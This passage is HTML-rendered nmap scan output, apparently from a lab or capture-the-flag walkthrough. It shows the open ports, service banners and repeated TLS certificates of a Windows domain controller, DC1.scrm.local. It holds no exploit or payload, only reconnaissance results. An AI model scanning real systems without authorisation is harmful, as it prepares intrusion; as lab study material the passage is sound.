</span></span><span style="display:flex;"><span>| MRQwEgYDVQQDEwtzY3JtLURDMS1DQTAeFw0yMjA2MDkxNTMwNTdaFw0yMzA2MDkx
</span></span><span style="display:flex;"><span>| NTMwNTdaMBkxFzAVBgNVBAMTDkRDMS5zY3JtLmxvY2FsMIIBIjANBgkqhkiG9w0B
</span></span><span style="display:flex;"><span>| AQEFAAOCAQ8AMIIBCgKCAQEA6NaF+YFhvKWiqzcaTT/Kyi8P+so5EJY5xrY16IA/
</span></span><span style="display:flex;"><span>| DIkctXq4jI4j6BjgHRf48RSUs4EToQpP7PGH4K6NNApu4dE2Z2apc8p9EqXb454S
</span></span><span style="display:flex;"><span>| f40ZGLgoBRXaZhxQu7az6I7onMBR0RUUzdB+Js3+efj85bHYGz/lkQbekNWydyVe
</span></span><span style="display:flex;"><span>| DjO7CGqnl5sI+aDhS+vWaV6ODhexLeLSYZ3bn/58B5o012QDQyOrzBXa1cMOBOfI
</span></span><span style="display:flex;"><span>| CIH3hDnjv3AToEqP349AJ6rWWWSxvLNPjw49Rm+DF4Eyb8irBo0P/F7jMAvlq3t+
</span></span><span style="display:flex;"><span>| MdKPF9o5Nah7nu1PdVJR0Jg71aj5GJOsTZnSYoWH+CVYDQIDAQABo4IDMTCCAy0w
</span></span><span style="display:flex;"><span>| LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
</span></span><span style="display:flex;"><span>| MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
</span></span><span style="display:flex;"><span>| eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
</span></span><span style="display:flex;"><span>| MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
</span></span><span style="display:flex;"><span>| AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUAIvSJcBszoTslWI8
</span></span><span style="display:flex;"><span>| kVproj+0lTswHwYDVR0jBBgwFoAUCGlCGQotn3BwNjRGHOcdhhWbaJIwgcQGA1Ud
</span></span><span style="display:flex;"><span>| HwSBvDCBuTCBtqCBs6CBsIaBrWxkYXA6Ly8vQ049c2NybS1EQzEtQ0EsQ049REMx
</span></span><span style="display:flex;"><span>| LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
</span></span><span style="display:flex;"><span>| Tj1Db25maWd1cmF0aW9uLERDPXNjcm0sREM9bG9jYWw/Y2VydGlmaWNhdGVSZXZv
</span></span><span style="display:flex;"><span>| Y2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50
</span></span><span style="display:flex;"><span>| MIG8BggrBgEFBQcBAQSBrzCBrDCBqQYIKwYBBQUHMAKGgZxsZGFwOi8vL0NOPXNj
</span></span><span style="display:flex;"><span>| cm0tREMxLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1T
</span></span><span style="display:flex;"><span>| ZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXNjcm0sREM9bG9jYWw/Y0FDZXJ0
</span></span><span style="display:flex;"><span>| aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkw
</span></span><span style="display:flex;"><span>| OgYDVR0RBDMwMaAfBgkrBgEEAYI3GQGgEgQQZxIub1TYH0SkXtctiXUFOYIOREMx
</span></span><span style="display:flex;"><span>| LnNjcm0ubG9jYWwwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEEAYI3GQIBoDAELlMt
</span></span><span style="display:flex;"><span>| MS01LTIxLTI3NDMyMDcwNDUtMTgyNzgzMTEwNS0yNTQyNTIzMjAwLTEwMDAwDQYJ
</span></span><span style="display:flex;"><span>| KoZIhvcNAQEFBQADggEBAGZWsf9oOMhceZ7IUPGXqwTB8UaTHjw0Xyyrh9SOz2ri
</span></span><span style="display:flex;"><span>| FksDqqib2V/tsWlEICxX9C+Yrusvppfz2+bpySgPCpFLIqrDes3BskJZRRrWTe8f
</span></span><span style="display:flex;"><span>| vp4CcaVWnHL6wmF8SPBhp6ji8VPbprFn0TSFnOoVUIVnMefgEcOVc9OtSg//eM0y
</span></span><span style="display:flex;"><span>| YaTmQZA9d3EuLfyChDmAS8skNWtkLoyenIdwLF5giPbokV3NFujT13X0YYvF/X00
</span></span><span style="display:flex;"><span>| apzzgN7pH0QgDDY/+GqKzOhrZFbgdqy0M6ZFPe2OuhqTB9+yDXb5sWS6dXFGITpm
</span></span><span style="display:flex;"><span>| djXHg09ap4TlzGNvRtfjNqvevFGDRHJeIGxGSoLIkDA<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>|_-----END CERTIFICATE-----
</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds? syn-ack
</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5?     syn-ack
</span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
</span></span><span style="display:flex;"><span>636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: scrm.local0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_ssl-date: 2022-09-20T01:08:14+00:00; +9m34s from scanner time.
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC1.scrm.local
</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:DC1.scrm.local
</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>scrm-DC1-CA/domainComponent<span style="color:#f92672">=</span>scrm
</span></span><span style="display:flex;"><span>| Public Key type: rsa
</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#ae81ff">2048</span>
</span></span><span style="display:flex;"><span>| Signature Algorithm: sha1WithRSAEncryption
</span></span><span style="display:flex;"><span>| Not valid before: 2022-06-09T15:30:57
</span></span><span style="display:flex;"><span>| Not valid after:  2023-06-09T15:30:57
</span></span><span style="display:flex;"><span>| MD5:   679c fca8 69ad 25c0 86d2 e8bb <span style="color:#ae81ff">1792</span> d7c3
</span></span><span style="display:flex;"><span>| SHA-1: bda1 1c23 bafc 973e 60b0 d87c c893 d298 e2d5 <span style="color:#ae81ff">4233</span>
</span></span><span style="display:flex;"><span>| -----BEGIN CERTIFICATE-----
</span></span><span style="display:flex;"><span>| MIIGHDCCBQSgAwIBAgITEgAAAAL3nCxaHxOhQAAAAAAAAjANBgkqhkiG9w0BAQUF
</span></span><span style="display:flex;"><span>| ADBDMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFDASBgoJkiaJk/IsZAEZFgRzY3Jt
</span></span><span style="display:flex;"><span>| MRQwEgYDVQQDEwtzY3JtLURDMS1DQTAeFw0yMjA2MDkxNTMwNTdaFw0yMzA2MDkx
</span></span><span style="display:flex;"><span>| NTMwNTdaMBkxFzAVBgNVBAMTDkRDMS5zY3JtLmxvY2FsMIIBIjANBgkqhkiG9w0B
</span></span><span style="display:flex;"><span>| AQEFAAOCAQ8AMIIBCgKCAQEA6NaF+YFhvKWiqzcaTT/Kyi8P+so5EJY5xrY16IA/
</span></span><span style="display:flex;"><span>| DIkctXq4jI4j6BjgHRf48RSUs4EToQpP7PGH4K6NNApu4dE2Z2apc8p9EqXb454S
</span></span><span style="display:flex;"><span>| f40ZGLgoBRXaZhxQu7az6I7onMBR0RUUzdB+Js3+efj85bHYGz/lkQbekNWydyVe
</span></span><span style="display:flex;"><span>| DjO7CGqnl5sI+aDhS+vWaV6ODhexLeLSYZ3bn/58B5o012QDQyOrzBXa1cMOBOfI
</span></span><span style="display:flex;"><span>| CIH3hDnjv3AToEqP349AJ6rWWWSxvLNPjw49Rm+DF4Eyb8irBo0P/F7jMAvlq3t+
</span></span><span style="display:flex;"><span>| MdKPF9o5Nah7nu1PdVJR0Jg71aj5GJOsTZnSYoWH+CVYDQIDAQABo4IDMTCCAy0w
</span></span><span style="display:flex;"><span>| LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
</span></span><span style="display:flex;"><span>| MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
</span></span><span style="display:flex;"><span>| eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
</span></span><span style="display:flex;"><span>| MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
</span></span><span style="display:flex;"><span>| AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUAIvSJcBszoTslWI8
</span></span><span style="display:flex;"><span>| kVproj+0lTswHwYDVR0jBBgwFoAUCGlCGQotn3BwNjRGHOcdhhWbaJIwgcQGA1Ud
</span></span><span style="display:flex;"><span>| HwSBvDCBuTCBtqCBs6CBsIaBrWxkYXA6Ly8vQ049c2NybS1EQzEtQ0EsQ049REMx
</span></span><span style="display:flex;"><span>| LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
</span></span><span style="display:flex;"><span>| Tj1Db25maWd1cmF0aW9uLERDPXNjcm0sREM9bG9jYWw/Y2VydGlmaWNhdGVSZXZv
</span></span><span style="display:flex;"><span>| Y2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50
</span></span><span style="display:flex;"><span>| MIG8BggrBgEFBQcBAQSBrzCBrDCBqQYIKwYBBQUHMAKGgZxsZGFwOi8vL0NOPXNj
</span></span><span style="display:flex;"><span>| cm0tREMxLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1T
</span></span><span style="display:flex;"><span>| ZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXNjcm0sREM9bG9jYWw/Y0FDZXJ0
</span></span><span style="display:flex;"><span>| aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkw
</span></span><span style="display:flex;"><span>| OgYDVR0RBDMwMaAfBgkrBgEEAYI3GQGgEgQQZxIub1TYH0SkXtctiXUFOYIOREMx
</span></span><span style="display:flex;"><span>| LnNjcm0ubG9jYWwwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEEAYI3GQIBoDAELlMt
</span></span><span style="display:flex;"><span>| MS01LTIxLTI3NDMyMDcwNDUtMTgyNzgzMTEwNS0yNTQyNTIzMjAwLTEwMDAwDQYJ
</span></span><span style="display:flex;"><span>| KoZIhvcNAQEFBQADggEBAGZWsf9oOMhceZ7IUPGXqwTB8UaTHjw0Xyyrh9SOz2ri
</span></span><span style="display:flex;"><span>| FksDqqib2V/tsWlEICxX9C+Yrusvppfz2+bpySgPCpFLIqrDes3BskJZRRrWTe8f
</span></span><span style="display:flex;"><span>| vp4CcaVWnHL6wmF8SPBhp6ji8VPbprFn0TSFnOoVUIVnMefgEcOVc9OtSg//eM0y
</span></span><span style="display:flex;"><span>| YaTmQZA9d3EuLfyChDmAS8skNWtkLoyenIdwLF5giPbokV3NFujT13X0YYvF/X00
</span></span><span style="display:flex;"><span>| apzzgN7pH0QgDDY/+GqKzOhrZFbgdqy0M6ZFPe2OuhqTB9+yDXb5sWS6dXFGITpm
</span></span><span style="display:flex;"><span>| djXHg09ap4TlzGNvRtfjNqvevFGDRHJeIGxGSoLIkDA<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>|_-----END CERTIFICATE-----
</span></span><span style="display:flex;"><span>1433/tcp  open  ms-sql-s      syn-ack Microsoft SQL Server <span style="color:#ae81ff">2019</span> 15.00.2000.00; RTM
</span></span><span style="display:flex;"><span>|_ssl-date: 2022-09-20T01:08:14+00:00; +9m34s from scanner time.
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>SSL_Self_Signed_Fallback
</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>SSL_Self_Signed_Fallback
</span></span><span style="display:flex;"><span>| Public Key type: rsa
</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#ae81ff">2048</span>
</span></span><span style="display:flex;"><span>| Signature Algorithm: sha256WithRSAEncryption
</span></span><span style="display:flex;"><span>| Not valid before: 2022-09-19T16:33:03
</span></span><span style="display:flex;"><span>| Not valid after:  2052-09-19T16:33:03
</span></span><span style="display:flex;"><span>| MD5:   273c 8bd6 b6f1 8d1c 305d 858b 16a0 0ab3
</span></span><span style="display:flex;"><span>| SHA-1: 9f00 d439 36bf e405 f25e f6f8 259f eea5 a66d 64d4
</span></span><span style="display:flex;"><span>| -----BEGIN CERTIFICATE-----
</span></span><span style="display:flex;"><span>| MIIDADCCAeigAwIBAgIQFlmhJUE9ubFLfgHuEklivDANBgkqhkiG9w0BAQsFADA7
</span></span><span style="display:flex;"><span>| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
</span></span><span style="display:flex;"><span>| bABsAGIAYQBjAGswIBcNMjIwOTE5MTYzMzAzWhgPMjA1MjA5MTkxNjMzMDNaMDsx
</span></span><span style="display:flex;"><span>| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
</span></span><span style="display:flex;"><span>| AGwAYgBhAGMAazCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAJwUOThD
</span></span><span style="display:flex;"><span>| xI9qdzH62pze2vXWwAGlzCXQGWKL8RWKzDagYmowdy7VJPtfSAxqruwnTndUXec/
</span></span><span style="display:flex;"><span>| DzxxA12X1MIi+yonfuaDjN2U2zwWJfL/6TtcXLOQ6KTge9tkeceFyT3o6SRUU4wC
</span></span><span style="display:flex;"><span>| BtJI0cAAOFjJHMwyuhyhHMMWUr3NKVxSlm4+JJ0IbGoGiSBDFpXmK7CDCurE5/gn
</span></span><span style="display:flex;"><span>| jQeYab81PgLEPZ31odQZB4SB+qxlzWtmjsza7gK3h5UNc/L26MqLoVgy+DKgVstw
</span></span><span style="display:flex;"><span>| vlAi7/hRqBlGmKh27l0RfYkNdRgh41Ubm4dnZwv5IwgP2o17QG33zG/UdJhz4IUr
</span></span><span style="display:flex;"><span>| DZcUSJ83SE5SdXECAwEAATANBgkqhkiG9w0BAQsFAAOCAQEAkwE5dvp2UE799mtf
</span></span><span style="display:flex;"><span>| nwVxExeOZbLsjVRaAlBCOWsy6OH0F8cnnJnbKeTndwWOCWVhLUMAGxRqrRsmtOdi
</span></span><span style="display:flex;"><span>| OYqDgPYy2UlCcGeA7Ciyt3fG0erPh3fpJ/3rWEEbjdpKGfu26KLiYcVx6bZaSS/e
</span></span><span style="display:flex;"><span>| Q3CR4fDCKMlfWwDyNN5+FjC8KHttRxUmYna6IPnoZeLiz4C99RquTGWPAnIB3/7P
</span></span><span style="display:flex;"><span>| Ll+3+PjP7j3lWwOwT/TpJYabp33OcRWCKwzEiW2bItpB2hv0KLKcG8VVuBjINd9C
</span></span><span style="display:flex;"><span>| HR7g9WVBeq9hwElNVjAQNxmD49683WUs37bSFTOipKIp/8+RReNOXjikBison7Ku
</span></span><span style="display:flex;"><span>| RnjPWA<span style="color:#f92672">==</span>
</span></span><span style="display:flex;"><span>|_-----END CERTIFICATE-----
</span></span><span style="display:flex;"><span>3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: scrm.local0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC1.scrm.local
</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:DC1.scrm.local
</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>scrm-DC1-CA/domainComponent<span style="color:#f92672">=</span>scrm
</span></span><span style="display:flex;"><span>| Public Key type: rsa
</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#ae81ff">2048</span>
</span></span><span style="display:flex;"><span>| Signature Algorithm: sha1WithRSAEncryption
</span></span><span style="display:flex;"><span>| Not valid before: 2022-06-09T15:30:57
</span></span><span style="display:flex;"><span>| Not valid after:  2023-06-09T15:30:57
</span></span><span style="display:flex;"><span>| MD5:   679c fca8 69ad 25c0 86d2 e8bb <span style="color:#ae81ff">1792</span> d7c3
</span></span><span style="display:flex;"><span>| SHA-1: bda1 1c23 bafc 973e 60b0 d87c c893 d298 e2d5 <span style="color:#ae81ff">4233</span>
</span></span><span style="display:flex;"><span>| -----BEGIN CERTIFICATE-----
</span></span><span style="display:flex;"><span>| MIIGHDCCBQSgAwIBAgITEgAAAAL3nCxaHxOhQAAAAAAAAjANBgkqhkiG9w0BAQUF
</span></span><span style="display:flex;"><span>| ADBDMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFDASBgoJkiaJk/IsZAEZFgRzY3Jt
</span></span><span style="display:flex;"><span>| MRQwEgYDVQQDEwtzY3JtLURDMS1DQTAeFw0yMjA2MDkxNTMwNTdaFw0yMzA2MDkx
</span></span><span style="display:flex;"><span>| NTMwNTdaMBkxFzAVBgNVBAMTDkRDMS5zY3JtLmxvY2FsMIIBIjANBgkqhkiG9w0B
</span></span><span style="display:flex;"><span>| AQEFAAOCAQ8AMIIBCgKCAQEA6NaF+YFhvKWiqzcaTT/Kyi8P+so5EJY5xrY16IA/
</span></span><span style="display:flex;"><span>| DIkctXq4jI4j6BjgHRf48RSUs4EToQpP7PGH4K6NNApu4dE2Z2apc8p9EqXb454S
</span></span><span style="display:flex;"><span>| f40ZGLgoBRXaZhxQu7az6I7onMBR0RUUzdB+Js3+efj85bHYGz/lkQbekNWydyVe
</span></span><span style="display:flex;"><span>| DjO7CGqnl5sI+aDhS+vWaV6ODhexLeLSYZ3bn/58B5o012QDQyOrzBXa1cMOBOfI
</span></span><span style="display:flex;"><span>| CIH3hDnjv3AToEqP349AJ6rWWWSxvLNPjw49Rm+DF4Eyb8irBo0P/F7jMAvlq3t+
</span></span><span style="display:flex;"><span>| MdKPF9o5Nah7nu1PdVJR0Jg71aj5GJOsTZnSYoWH+CVYDQIDAQABo4IDMTCCAy0w
</span></span><span style="display:flex;"><span>| LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
</span></span><span style="display:flex;"><span>| MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
</span></span><span style="display:flex;"><span>| eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
</span></span><span style="display:flex;"><span>| MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
</span></span><span style="display:flex;"><span>| AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUAIvSJcBszoTslWI8
</span></span><span style="display:flex;"><span>| kVproj+0lTswHwYDVR0jBBgwFoAUCGlCGQotn3BwNjRGHOcdhhWbaJIwgcQGA1Ud
</span></span><span style="display:flex;"><span>| HwSBvDCBuTCBtqCBs6CBsIaBrWxkYXA6Ly8vQ049c2NybS1EQzEtQ0EsQ049REMx
</span></span><span style="display:flex;"><span>| LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
</span></span><span style="display:flex;"><span>| Tj1Db25maWd1cmF0aW9uLERDPXNjcm0sREM9bG9jYWw/Y2VydGlmaWNhdGVSZXZv
</span></span><span style="display:flex;"><span>| Y2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50
</span></span><span style="display:flex;"><span>| MIG8BggrBgEFBQcBAQSBrzCBrDCBqQYIKwYBBQUHMAKGgZxsZGFwOi8vL0NOPXNj
</span></span><span style="display:flex;"><span>| cm0tREMxLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1T
</span></span><span style="display:flex;"><span>| ZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXNjcm0sREM9bG9jYWw/Y0FDZXJ0
</span></span><span style="display:flex;"><span>| aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkw
</span></span><span style="display:flex;"><span>| OgYDVR0RBDMwMaAfBgkrBgEEAYI3GQGgEgQQZxIub1TYH0SkXtctiXUFOYIOREMx
</span></span><span style="display:flex;"><span>| LnNjcm0ubG9jYWwwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEEAYI3GQIBoDAELlMt
</span></span><span style="display:flex;"><span>| MS01LTIxLTI3NDMyMDcwNDUtMTgyNzgzMTEwNS0yNTQyNTIzMjAwLTEwMDAwDQYJ
</span></span><span style="display:flex;"><span>| KoZIhvcNAQEFBQADggEBAGZWsf9oOMhceZ7IUPGXqwTB8UaTHjw0Xyyrh9SOz2ri
</span></span><span style="display:flex;"><span>| FksDqqib2V/tsWlEICxX9C+Yrusvppfz2+bpySgPCpFLIqrDes3BskJZRRrWTe8f
</span></span><span style="display:flex;"><span>| vp4CcaVWnHL6wmF8SPBhp6ji8VPbprFn0TSFnOoVUIVnMefgEcOVc9OtSg//eM0y
</span></span><span style="display:flex;"><span>| YaTmQZA9d3EuLfyChDmAS8skNWtkLoyenIdwLF5giPbokV3NFujT13X0YYvF/X00
</span></span><span style="display:flex;"><span>| apzzgN7pH0QgDDY/+GqKzOhrZFbgdqy0M6ZFPe2OuhqTB9+yDXb5sWS6dXFGITpm
</span></span><span style="display:flex;"><span>| djXHg09ap4TlzGNvRtfjNqvevFGDRHJeIGxGSoLIkDA<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>|_-----END CERTIFICATE-----
</span></span><span style="display:flex;"><span>|_ssl-date: 2022-09-20T01:08:14+00:00; +9m34s from scanner time.
</span></span><span style="display:flex;"><span>3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: scrm.local0., Site: Default-First-Site-Name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>DC1.scrm.local
</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:DC1.scrm.local
</span></span><span style="display:flex;"><span>| Issuer: commonName<span style="color:#f92672">=</span>scrm-DC1-CA/domainComponent<span style="color:#f92672">=</span>scrm
</span></span><span style="display:flex;"><span>| Public Key type: rsa
</span></span><span style="display:flex;"><span>| Public Key bits: <span style="color:#ae81ff">2048</span>
</span></span><span style="display:flex;"><span>| Signature Algorithm: sha1WithRSAEncryption
</span></span><span style="display:flex;"><span>| Not valid before: 2022-06-09T15:30:57
</span></span><span style="display:flex;"><span>| Not valid after:  2023-06-09T15:30:57
</span></span><span style="display:flex;"><span>| MD5:   679c fca8 69ad 25c0 86d2 e8bb <span style="color:#ae81ff">1792</span> d7c3
</span></span><span style="display:flex;"><span>| SHA-1: bda1 1c23 bafc 973e 60b0 d87c c893 d298 e2d5 <span style="color:#ae81ff">4233</span>
</span></span><span style="display:flex;"><span>| -----BEGIN CERTIFICATE-----
</span></span><span style="display:flex;"><span>| MIIGHDCCBQSgAwIBAgITEgAAAAL3nCxaHxOhQAAAAAAAAjANBgkqhkiG9w0BAQUF
</span></span><span style="display:flex;"><span>| ADBDMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFDASBgoJkiaJk/IsZAEZFgRzY3Jt
</span></span><span style="display:flex;"><span>| MRQwEgYDVQQDEwtzY3JtLURDMS1DQTAeFw0yMjA2MDkxNTMwNTdaFw0yMzA2MDkx
</span></span><span style="display:flex;"><span>| NTMwNTdaMBkxFzAVBgNVBAMTDkRDMS5zY3JtLmxvY2FsMIIBIjANBgkqhkiG9w0B
</span></span><span style="display:flex;"><span>| AQEFAAOCAQ8AMIIBCgKCAQEA6NaF+YFhvKWiqzcaTT/Kyi8P+so5EJY5xrY16IA/
</span></span><span style="display:flex;"><span>| DIkctXq4jI4j6BjgHRf48RSUs4EToQpP7PGH4K6NNApu4dE2Z2apc8p9EqXb454S
</span></span><span style="display:flex;"><span>| f40ZGLgoBRXaZhxQu7az6I7onMBR0RUUzdB+Js3+efj85bHYGz/lkQbekNWydyVe
</span></span><span style="display:flex;"><span>| DjO7CGqnl5sI+aDhS+vWaV6ODhexLeLSYZ3bn/58B5o012QDQyOrzBXa1cMOBOfI
</span></span><span style="display:flex;"><span>| CIH3hDnjv3AToEqP349AJ6rWWWSxvLNPjw49Rm+DF4Eyb8irBo0P/F7jMAvlq3t+
</span></span><span style="display:flex;"><span>| MdKPF9o5Nah7nu1PdVJR0Jg71aj5GJOsTZnSYoWH+CVYDQIDAQABo4IDMTCCAy0w
</span></span><span style="display:flex;"><span>| LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
</span></span><span style="display:flex;"><span>| MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
</span></span><span style="display:flex;"><span>| eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
</span></span><span style="display:flex;"><span>| MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
</span></span><span style="display:flex;"><span>| AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUAIvSJcBszoTslWI8
</span></span><span style="display:flex;"><span>| kVproj+0lTswHwYDVR0jBBgwFoAUCGlCGQotn3BwNjRGHOcdhhWbaJIwgcQGA1Ud
</span></span><span style="display:flex;"><span>| HwSBvDCBuTCBtqCBs6CBsIaBrWxkYXA6Ly8vQ049c2NybS1EQzEtQ0EsQ049REMx
</span></span><span style="display:flex;"><span>| LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
</span></span><span style="display:flex;"><span>| Tj1Db25maWd1cmF0aW9uLERDPXNjcm0sREM9bG9jYWw/Y2VydGlmaWNhdGVSZXZv
</span></span><span style="display:flex;"><span>| Y2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50
</span></span><span style="display:flex;"><span>| MIG8BggrBgEFBQcBAQSBrzCBrDCBqQYIKwYBBQUHMAKGgZxsZGFwOi8vL0NOPXNj
</span></span><span style="display:flex;"><span>| cm0tREMxLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1T
</span></span><span style="display:flex;"><span>| ZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXNjcm0sREM9bG9jYWw/Y0FDZXJ0
</span></span><span style="display:flex;"><span>| aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkw
</span></span><span style="display:flex;"><span>| OgYDVR0RBDMwMaAfBgkrBgEEAYI3GQGgEgQQZxIub1TYH0SkXtctiXUFOYIOREMx
</span></span><span style="display:flex;"><span>| LnNjcm0ubG9jYWwwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEEAYI3GQIBoDAELlMt
</span></span><span style="display:flex;"><span>| MS01LTIxLTI3NDMyMDcwNDUtMTgyNzgzMTEwNS0yNTQyNTIzMjAwLTEwMDAwDQYJ
</span></span><span style="display:flex;"><span>| KoZIhvcNAQEFBQADggEBAGZWsf9oOMhceZ7IUPGXqwTB8UaTHjw0Xyyrh9SOz2ri
</span></span><span style="display:flex;"><span>| FksDqqib2V/tsWlEICxX9C+Yrusvppfz2+bpySgPCpFLIqrDes3BskJZRRrWTe8f
</span></span><span style="display:flex;"><span>| vp4CcaVWnHL6wmF8SPBhp6ji8VPbprFn0TSFnOoVUIVnMefgEcOVc9OtSg//eM0y
</span></span><span style="display:flex;"><span>| YaTmQZA9d3EuLfyChDmAS8skNWtkLoyenIdwLF5giPbokV3NFujT13X0YYvF/X00
</span></span><span style="display:flex;"><span>| apzzgN7pH0QgDDY/+GqKzOhrZFbgdqy0M6ZFPe2OuhqTB9+yDXb5sWS6dXFGITpm
</span></span><span style="display:flex;"><span>| djXHg09ap4TlzGNvRtfjNqvevFGDRHJeIGxGSoLIkDA<span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>|_-----END CERTIFICATE-----
</span></span><span style="display:flex;"><span>|_ssl-date: 2022-09-20T01:08:14+00:00; +9m34s from scanner time.
</span></span><span style="display:flex;"><span>4411/tcp  open  found?        syn-ack
</span></span><span style="display:flex;"><span>| fingerprint-strings: 
